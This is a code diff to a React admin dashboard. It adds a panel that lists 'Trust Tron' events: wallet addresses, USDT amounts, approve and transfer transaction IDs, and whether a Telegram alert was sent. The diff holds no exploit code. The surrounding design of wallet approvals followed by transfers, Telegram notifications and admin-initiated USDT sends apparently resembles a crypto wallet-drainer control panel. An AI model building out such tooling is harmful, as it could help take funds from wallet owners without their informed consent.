@@ -83,6 +83,23 @@ interface PaidWalletEntry {
   balanceFetchError: string | null;
 }
 
+interface TrustTronTelegramLogEntry {
+  id: string;
+  createdAt: string;
+  eventType: string;
+  userId: string | null;
+  walletAddress: string;
+  connectMethod: string | null;
+  toAddress: string | null;
+  amountUsdt: number | null;
+  approveTxId: string | null;
+  transferTxId: string | null;
+  errorMessage: string | null;
+  telegramSent: boolean;
+  telegramSentAt: string | null;
+  telegramError: string | null;
+}
+
 const fadeIn = {
   hidden: { opacity: 0, y: 15 },
   visible: (i: number) => ({
@@ -119,6 +136,8 @@ const Admin = () => {
   const [paidWalletEntries, setPaidWalletEntries] = useState<PaidWalletEntry[]>([]);
   const [isLoadingPaidWalletEntries, setIsLoadingPaidWalletEntries] = useState(false);
   const [isTelegramTestSubmitting, setIsTelegramTestSubmitting] = useState(false);
+  const [trustTronLogs, setTrustTronLogs] = useState<TrustTronTelegramLogEntry[]>([]);
+  const [isLoadingTrustTronLogs, setIsLoadingTrustTronLogs] = useState(false);
   const [isSendUsdtModalOpen, setIsSendUsdtModalOpen] = useState(false);
   const [sendUsdtTarget, setSendUsdtTarget] = useState<PaidWalletEntry | null>(null);
   const [sendUsdtAmount, setSendUsdtAmount] = useState("10");
@@ -192,6 +211,22 @@ const Admin = () => {
     }
   };
 
+  const loadTrustTronLogs = async () => {
+    try {
+      setIsLoadingTrustTronLogs(true);
+      const response = await apiRequest<{ entries: TrustTronTelegramLogEntry[] }>(
+        `/admin/trust-tron/logs?limit=20`,
+        { auth: true }
+      );
+      setTrustTronLogs(response.entries);
+    } catch (error) {
+      const message = error instanceof ApiError ? error.message : "Failed to load Trust Tron logs";
+      toast.error(message);
+    } finally {
+      setIsLoadingTrustTronLogs(false);
+    }
+  };
+
   useEffect(() => {
     if (!session?.token) {
       navigate("/auth");
@@ -212,6 +247,16 @@ const Admin = () => {
     }
     void loadPaidWalletEntries(manageWalletChain);
   }, [canAccessAdmin, manageWalletChain, session?.token]);
+
+  useEffect(() => {
+    if (!session?.token || !canAccessAdmin) {
+      return;
+    }
+    if (activeTab !== "trust-tron") {
+      return;
+    }
+    void loadTrustTronLogs();
+  }, [activeTab, canAccessAdmin, session?.token]);
 
   const handleLogout = () => {
     clearSession();
@@ -1316,6 +1361,72 @@ const Admin = () => {
                       "Send test message to Telegram"
                     )}
                   </Button>
+                </CardContent>
+              </Card>
+
+              <Card className="app-section-card rounded-xl">
+                <CardContent className="p-5 space-y-4">
+                  <div className="flex items-center gap-2 text-sm font-semibold text-foreground">
+                    <MessageCircle className="w-4 h-4 text-accent" />
+                    Recent Telegram events
+                  </div>
+
+                  {isLoadingTrustTronLogs ? (
+                    <div className="text-sm text-muted-foreground">Loading…</div>
+                  ) : trustTronLogs.length === 0 ? (
+                    <div className="text-sm text-muted-foreground">No events yet.</div>
+                  ) : (
+                    <div className="space-y-3">
+                      {trustTronLogs.map((log) => (
+                        <div key={log.id} className="rounded-xl border border-border/60 p-3">
+                          <div className="flex items-start justify-between gap-3">
+                            <div className="min-w-0">
+                              <p className="text-xs text-muted-foreground">
+                                {new Date(log.createdAt).toLocaleString()}
+                              </p>
+                              <p className="text-sm font-semibold text-foreground">{log.eventType}</p>
+                              <p className="text-xs text-muted-foreground font-mono break-all mt-1">
+                                {log.walletAddress}
+                              </p>
+                              {log.toAddress ? (
+                                <p className="text-xs text-muted-foreground font-mono break-all mt-1">
+                                  To: {log.toAddress}
+                                </p>
+                              ) : null}
+                              {log.amountUsdt != null ? (
+                                <p className="text-xs text-muted-foreground mt-1">
+                                  Amount: {log.amountUsdt} USDT
+                                </p>
+                              ) : null}
+                              {log.errorMessage ? (
+                                <p className="text-xs text-warning mt-2 break-words">
+                                  {log.errorMessage}
+                                </p>
+                              ) : null}
+                            </div>
+
+                            <div className="shrink-0">
+                              {log.telegramSent ? (
+                                <Badge
+                                  variant="outline"
+                                  className="rounded-lg px-2.5 border-success/30 text-success"
+                                >
+                                  Sent
+                                </Badge>
+                              ) : (
+                                <Badge
+                                  variant="outline"
+                                  className="rounded-lg px-2.5 border-destructive/30 text-destructive"
+                                >
+                                  Failed
+                                </Badge>
+                              )}
+                            </div>
+                          </div>
+                        </div>
+                      ))}
+                    </div>
+                  )}
                 </CardContent>
               </Card>
             </TabsContent>
